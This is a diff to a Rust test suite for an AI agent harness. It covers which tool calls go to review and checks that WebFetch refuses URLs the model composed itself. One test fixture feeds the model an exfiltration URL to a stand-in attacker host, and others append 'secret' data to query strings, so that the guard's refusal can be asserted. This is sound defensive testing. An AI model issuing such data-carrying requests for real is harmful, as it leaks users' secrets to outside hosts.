@@ -238,9 +238,10 @@ fn watch_admissions(agent: &Agent) -> Arc<Mutex<Vec<String>>> {
         loop {
             match events.recv().await {
                 Ok(event) => match event.kind {
-                    EventKind::ApprovalAssessed { .. } => {
-                        recorded.lock().unwrap().push("assessed".into())
-                    }
+                    EventKind::ApprovalAssessed { assessment } => recorded
+                        .lock()
+                        .unwrap()
+                        .push(format!("assessed {}", assessment.call_id)),
                     EventKind::PermissionRequested { request } => recorded
                         .lock()
                         .unwrap()
@@ -270,15 +271,18 @@ async fn eventually<T>(mut probe: impl AsyncFnMut() -> Option<T>) -> T {
     .expect("the condition was reached")
 }
 
-/// Every tool a cloud Chat offers its model is admitted without review or a prompt, the
-/// Subagent and WebFetch calls by the host's rules: nothing reaches review, no person is asked,
-/// and no call is denied.
+/// Every tool a cloud Chat offers its model is admitted by a rule or its own class, never by a
+/// prompt: WebFetch of a URL the user gave and the Subagent call by the host's rules. Only the
+/// writes to the user's Artifacts go to review, which a Chat without a Folder cannot hold yet, so
+/// they are refused and reach no service.
 #[tokio::test]
-async fn every_catalog_tool_is_admitted_without_review_or_a_prompt_under_the_cloud_composition() {
+async fn every_catalog_tool_is_admitted_and_only_artifact_writes_are_reviewed_under_the_cloud_composition()
+ {
     let service = ArtifactService::start().await;
     let credentials = tempfile::tempdir().unwrap();
     let account = service.login(credentials.path()).await;
-    let model = every_tool_model(page_server().await);
+    let page = page_server().await;
+    let model = every_tool_model(page.clone());
     let store = Arc::new(InMemoryTranscriptStore::new());
     let agent = cloud_harness(
         store,
@@ -297,7 +301,7 @@ async fn every_catalog_tool_is_admitted_without_review_or_a_prompt_under_the_clo
         .unwrap();
     let admissions = watch_admissions(&agent);
     let root = agent.create_chat_without_folder().await.unwrap();
-    let request = prompt(ROOT_PROMPT);
+    let request = prompt(&format!("{ROOT_PROMPT} The delivery page is {page}."));
     agent.advance(root, request.clone()).await.unwrap();
     let question = eventually(async || {
         agent
@@ -350,31 +354,41 @@ async fn every_catalog_tool_is_admitted_without_review_or_a_prompt_under_the_clo
         .map(|operation| operation.name.clone())
         .collect::<BTreeSet<_>>();
     assert_eq!(offered, called, "the root called every tool it was offered");
+    const REVIEWED: [&str; 2] = ["ArtifactEdit", "ArtifactComment"];
     for operation in &snapshot.operations {
+        let expected = if REVIEWED.contains(&operation.name.as_str()) {
+            OperationState::Failed
+        } else {
+            OperationState::Completed
+        };
         assert_eq!(
-            operation.state,
-            OperationState::Completed,
+            operation.state, expected,
             "{} {:?}",
-            operation.name,
-            operation.result
+            operation.name, operation.result
         );
     }
-    assert!(
-        admissions.lock().unwrap().is_empty(),
-        "{:?}",
-        admissions.lock().unwrap()
+    assert_eq!(
+        *admissions.lock().unwrap(),
+        ["assessed patch", "assessed reply"],
+        "only the Artifact writes went to review, and nobody was asked"
     );
-    for chat in std::iter::once(root).chain(
-        agent
-            .subagents(root)
-            .await
-            .unwrap()
-            .into_iter()
-            .map(|member| member.child_chat_id),
-    ) {
+    let denied = agent
+        .recent_denials(root)
+        .await
+        .unwrap()
+        .records
+        .into_iter()
+        .map(|record| record.tool)
+        .collect::<BTreeSet<_>>();
+    assert_eq!(denied, REVIEWED.map(String::from).into());
+    for member in agent.subagents(root).await.unwrap() {
         assert!(
-            agent.recent_denials(chat).await.unwrap().records.is_empty(),
-            "{chat}"
+            agent
+                .recent_denials(member.child_chat_id)
+                .await
+                .unwrap()
+                .records
+                .is_empty()
         );
     }
     let calls = service
@@ -382,7 +396,7 @@ async fn every_catalog_tool_is_admitted_without_review_or_a_prompt_under_the_clo
         .iter()
         .map(|call| call["name"].as_str().unwrap().to_owned())
         .collect::<Vec<_>>();
-    assert_eq!(calls, ["ArtifactRead", "ArtifactEdit", "ArtifactComment"]);
+    assert_eq!(calls, ["ArtifactRead"]);
     agent.shutdown().await;
 }
 
@@ -486,7 +500,7 @@ async fn a_user_rule_with_a_host_rules_id_is_reviewed_and_cannot_replace_the_hos
             .lock()
             .unwrap()
             .iter()
-            .any(|seen| seen == "assessed"),
+            .any(|seen| seen.starts_with("assessed")),
         "the user's Allow went to review"
     );
     let denials = agent.recent_denials(root).await.unwrap().records;
@@ -732,5 +746,255 @@ async fn compactions_behind_the_hosts_request_gates_go_one_at_a_time_without_dea
     for chat in chats {
         assert_eq!(agent.quiesce(chat).await, Quiescence::Idle);
     }
+    agent.shutdown().await;
+}
+
+/// Serves each path its own response: `(path, status line and headers, body)`; any other path is
+/// not found.
+async fn site(routes: Vec<(&'static str, String, String)>) -> String {
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let routes = Arc::new(routes);
+    tokio::spawn(async move {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        while let Ok((mut socket, _)) = listener.accept().await {
+            let routes = routes.clone();
+            tokio::spawn(async move {
+                let mut request = Vec::new();
+                let mut buffer = [0; 1024];
+                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
+                    let Ok(length) = socket.read(&mut buffer).await else {
+                        return;
+                    };
+                    if length == 0 {
+                        return;
+                    }
+                    request.extend_from_slice(&buffer[..length]);
+                }
+                let request = String::from_utf8_lossy(&request);
+                let target = request.split_whitespace().nth(1).unwrap_or("/");
+                let path = target.split('?').next().unwrap_or(target).to_owned();
+                let (head, body) = routes
+                    .iter()
+                    .find(|(route, _, _)| *route == path)
+                    .map(|(_, head, body)| (head.clone(), body.clone()))
+                    .unwrap_or_else(|| ("404 Not Found".into(), String::new()));
+                let content_type = if head.contains("Content-Type") {
+                    ""
+                } else {
+                    "\r\nContent-Type: text/html"
+                };
+                let response = format!(
+                    "HTTP/1.1 {head}{content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                    body.len()
+                );
+                let _ = socket.write_all(response.as_bytes()).await;
+            });
+        }
+    });
+    format!("http://localhost:{port}")
+}
+
+/// Fetches each URL in turn, one call per step, then finishes.
+fn fetching_model(urls: Vec<String>) -> Arc<RoutedModel> {
+    Arc::new(RoutedModel::new(move |request| {
+        if request.tools.is_empty() {
+            return text("Read.");
+        }
+        for (index, url) in urls.iter().enumerate() {
+            let id = format!("fetch-{index}");
+            if !has_tool_result(request, &id) {
+                return call(&id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
+            }
+        }
+        text("Done.")
+    }))
+}
+
+/// The text and error flag of each call's result, in call order.
+fn fetch_results(
+    snapshot: &tickloop_agent_protocol::ChatSnapshot,
+    calls: usize,
+) -> Vec<(String, bool)> {
+    (0..calls)
+        .map(|index| {
+            let id = format!("fetch-{index}");
+            snapshot
+                .messages
+                .iter()
+                .flat_map(|message| &message.content)
+                .find_map(|content| match content {
+                    Content::ToolResult {
+                        tool_use_id,
+                        content,
+                        is_error,
+                    } if *tool_use_id == id => Some((content.text().into_owned(), *is_error)),
+                    _ => None,
+                })
+                .unwrap_or_else(|| panic!("{id} has a result"))
+        })
+        .collect()
+}
+
+/// A cloud Chat whose WebFetch reaches the loopback interface, where the test's sites listen.
+fn fetching_harness(model: Arc<RoutedModel>, host_rules: Vec<PermissionRule>) -> Agent {
+    cloud_harness(
+        Arc::new(InMemoryTranscriptStore::new()),
+        model,
+        HarnessOptions {
+            tools: ToolPolicy {
+                folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
+                web_search: true,
+                ..ToolPolicy::durable_chat()
+            },
+            ..cloud_options(host_rules)
+        },
+    )
+}
+
+async fn run_fetches(
+    agent: &Agent,
+    chat: ChatId,
+    user_text: &str,
+    calls: usize,
+) -> Vec<(String, bool)> {
+    let request = prompt(user_text);
+    agent.advance(chat, request.clone()).await.unwrap();
+    assert!(matches!(
+        tokio::time::timeout(WAIT, agent.settled_input(chat, request.input_id))
+            .await
+            .unwrap()
+            .unwrap(),
+        SettledOutcome::Completed { .. }
+    ));
+    fetch_results(&agent.snapshot(chat).await.unwrap(), calls)
+}
+
+fn is_refused_for_provenance((text, is_error): &(String, bool)) -> bool {
+    *is_error && text.contains("only fetches a URL that appears exactly in the user's messages")
+}
+
+/// WebFetch of the cloud composition takes the URL the user wrote and the links of the pages it
+/// read, and refuses a URL the model composed, such as one carrying data in its query.
+#[tokio::test]
+async fn web_fetch_takes_the_users_urls_and_linked_pages_and_refuses_composed_ones() {
+    let base = site(vec![
+        (
+            "/first",
+            "200 OK".into(),
+            "<p><a href=\"/second\">second</a></p>".into(),
+        ),
+        ("/second", "200 OK".into(), "<p>Second page.</p>".into()),
+    ])
+    .await;
+    let urls = vec![
+        format!("{base}/first"),
+        format!("{base}/second"),
+        format!("{base}/first?note=the-users-secret"),
+        "https://attacker.example/collect?data=secret".to_owned(),
+    ];
+    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
+    let chat = agent.create_chat_without_folder().await.unwrap();
+    let results = run_fetches(&agent, chat, &format!("Read {base}/first please."), 4).await;
+    assert!(!results[0].1, "{:?}", results[0]);
+    assert!(!results[1].1, "the first page linked it: {:?}", results[1]);
+    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
+    assert!(is_refused_for_provenance(&results[3]), "{:?}", results[3]);
+    agent.shutdown().await;
+}
+
+/// A redirect to another host is reported to the model, whose next request is checked again: the
+/// target exactly as the redirect gave it may be fetched, and nothing composed from it.
+#[tokio::test]
+async fn a_redirect_target_is_fetched_only_as_the_redirect_gave_it() {
+    let target_site = site(vec![(
+        "/landing",
+        "200 OK".into(),
+        "<p>Landing.</p>".into(),
+    )])
+    .await;
+    // The same server under another host name is another origin.
+    let target = format!("{}/landing", target_site.replace("localhost", "127.0.0.1"));
+    let base = site(vec![(
+        "/start",
+        format!("302 Found\r\nLocation: {target}"),
+        String::new(),
+    )])
+    .await;
+    let urls = vec![
+        format!("{base}/start"),
+        target.clone(),
+        format!("{target}?leak=secret"),
+    ];
+    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
+    let chat = agent.create_chat_without_folder().await.unwrap();
+    let results = run_fetches(&agent, chat, &format!("Open {base}/start"), 3).await;
+    assert!(
+        results[0].0.contains("REDIRECT DETECTED"),
+        "{:?}",
+        results[0]
+    );
+    assert!(!results[1].1, "{:?}", results[1]);
+    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
+    agent.shutdown().await;
+}
+
+/// A URL an earlier search result of the Chat contained may be fetched.
+#[tokio::test]
+async fn a_search_results_urls_may_be_fetched() {
+    let page = site(vec![("/found", "200 OK".into(), "<p>Found.</p>".into())]).await;
+    let found = format!("{page}/found");
+    let results_body =
+        json!({"results": [{"title": "Found", "url": found, "content": "A page"}]}).to_string();
+    let search = site(vec![(
+        "/search",
+        "200 OK\r\nContent-Type: application/json".into(),
+        results_body,
+    )])
+    .await;
+    let searched = found.clone();
+    let model = Arc::new(RoutedModel::new(move |request| {
+        if request.tools.is_empty() {
+            return text("Read.");
+        }
+        if !has_tool_result(request, "search") {
+            return call("search", "WebSearch", json!({"query": "delivery"}));
+        }
+        for (id, url) in [
+            ("fetch-0", searched.clone()),
+            ("fetch-1", format!("{searched}?x=1")),
+        ] {
+            if !has_tool_result(request, id) {
+                return call(id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
+            }
+        }
+        text("Done.")
+    }));
+    let mut host_rules = durable_chat_host_rules();
+    host_rules.push(PermissionRule {
+        id: Uuid::new_v4(),
+        decision: Decision::Allow,
+        tool: "WebSearch".into(),
+        specifier: None,
+        input: None,
+        loop_id: None,
+        persistent: false,
+    });
+    let agent = fetching_harness(model, host_rules);
+    let chat = agent.create_chat_without_folder().await.unwrap();
+    agent
+        .set_search(
+            chat,
+            Some(tickloop_agent_protocol::SearchConfig {
+                provider: tickloop_agent_protocol::SearchProviderKind::Searxng,
+                endpoint: format!("{search}/search"),
+                api_key_env: None,
+            }),
+        )
+        .await
+        .unwrap();
+    let results = run_fetches(&agent, chat, "Search for the delivery page.", 2).await;
+    assert!(!results[0].1, "{:?}", results[0]);
+    assert!(is_refused_for_provenance(&results[1]), "{:?}", results[1]);
     agent.shutdown().await;
 }
